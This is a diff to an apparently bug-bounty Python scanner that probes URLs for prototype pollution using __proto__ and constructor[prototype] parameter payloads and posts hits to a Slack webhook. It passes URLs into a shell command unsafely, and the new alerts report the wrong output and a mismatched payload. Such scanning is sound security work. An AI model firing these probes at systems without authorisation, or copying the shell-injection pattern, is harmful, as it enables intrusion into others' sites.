@@ -10,10 +10,18 @@ def proto_check(self, url):
     if "?" in final_url:
         proto_pollution_check = subprocess.run([f"~/go/bin/Run_JS -u '{final_url}&__proto__[rs0n]=wuzhere' -j 'window.rs0n'"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, shell=True)
         if "[!] ERROR" not in proto_pollution_check.stdout and "wuzhere" in proto_pollution_check.stdout:
-            message_json = {'text':f'{final_url} appears to be vulnerable to Prototype Pollution attacks!\n\nPayload: {final_url}?__proto__[rs0n]=wuzhere\nResponse: {proto_pollution_check.stdout}','username':'Vuln Disco Box','icon_emoji':':dart:'}
+            message_json = {'text':f'{final_url} appears to be vulnerable to Prototype Pollution attacks!\n\nPayload: {final_url}&__proto__[rs0n]=wuzhere\nResponse: {proto_pollution_check.stdout}','username':'Vuln Disco Box','icon_emoji':':dart:'}
             f = open(f'{home_dir}/.keys/slack_web_hook')
             token = f.read()
             slack_auto = requests.post(f'https://hooks.slack.com/services/{token}', json=message_json)
+        else:
+            proto_pollution_constructor_check = subprocess.run([f"~/go/bin/Run_JS -u '{final_url}&constructor[prototype][rs0n]=wuzhere' -j 'window.rs0n'"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, shell=True)
+            if "[!] ERROR" not in proto_pollution_constructor_check.stdout and "wuzhere" in proto_pollution_constructor_check.stdout:
+                message_json = {'text':f'{final_url} appears to be vulnerable to Prototype Pollution attacks!\n\nPayload: {final_url}&constructor[__proto__][rs0n]=wuzhere\nResponse: {proto_pollution_check.stdout}','username':'Vuln Disco Box','icon_emoji':':dart:'}
+                f = open(f'{home_dir}/.keys/slack_web_hook')
+                token = f.read()
+                slack_auto = requests.post(f'https://hooks.slack.com/services/{token}', json=message_json)
+
     else:
         proto_pollution_check = subprocess.run([f"~/go/bin/Run_JS -u '{final_url}?__proto__[rs0n]=wuzhere' -j 'window.rs0n'"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, shell=True)
         if "[!] ERROR" not in proto_pollution_check.stdout and "wuzhere" in proto_pollution_check.stdout:
@@ -21,6 +29,13 @@ def proto_check(self, url):
             f = open(f'{home_dir}/.keys/slack_web_hook')
             token = f.read()
             slack_auto = requests.post(f'https://hooks.slack.com/services/{token}', json=message_json)
+        else:
+            proto_pollution_constructor_check = subprocess.run([f"~/go/bin/Run_JS -u '{final_url}?constructor[prototype][rs0n]=wuzhere' -j 'window.rs0n'"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, shell=True)
+            if "[!] ERROR" not in proto_pollution_constructor_check.stdout and "wuzhere" in proto_pollution_constructor_check.stdout:
+                message_json = {'text':f'{final_url} appears to be vulnerable to Prototype Pollution attacks!\n\nPayload: {final_url}?constructor[__proto__][rs0n]=wuzhere\nResponse: {proto_pollution_check.stdout}','username':'Vuln Disco Box','icon_emoji':':dart:'}
+                f = open(f'{home_dir}/.keys/slack_web_hook')
+                token = f.read()
+                slack_auto = requests.post(f'https://hooks.slack.com/services/{token}', json=message_json)
 
 full_cmd_arguments = sys.argv
 argument_list = full_cmd_arguments[1:]
@@ -71,7 +86,10 @@ length = len(urls)
 print(f"Total URLs: {length}")
 
 while len(urls) > 0:
-    x_ls = list(range(threads))
+    if len(urls) < threads:
+        x_ls = list(range(len(urls)))
+    else:
+        x_ls = list(range(threads))
     thread_list = []
     for x in x_ls:
         u = urls[0]
